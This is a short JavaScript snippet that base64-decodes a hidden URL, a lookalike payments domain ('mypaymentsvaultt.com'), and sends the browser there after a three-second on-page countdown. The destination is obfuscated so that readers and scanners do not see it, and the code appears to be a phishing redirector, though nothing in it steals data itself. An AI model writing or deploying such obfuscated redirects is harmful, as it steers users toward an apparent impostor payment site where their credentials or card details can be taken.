// Decode base64 URL
function base64Decode(base64) {
  return decodeURIComponent(escape(window.atob(base64)));
}

// Base64 encoded URL
const base64Url = "aHR0cHM6Ly9teXBheW1lbnRzdmF1bHR0LmNvbS8=";
const url = base64Decode(base64Url);

// Timer countdown and redirect
let countdown = 3;
const timerElement = document.getElementById("timer");

function updateTimer() {
  timerElement.textContent = countdown;
  if (countdown <= 0) {
    window.location.href = url;
  } else {
    countdown--;
    setTimeout(updateTimer, 1000); // Update timer every second
  }
}

// Start the timer
updateTimer();
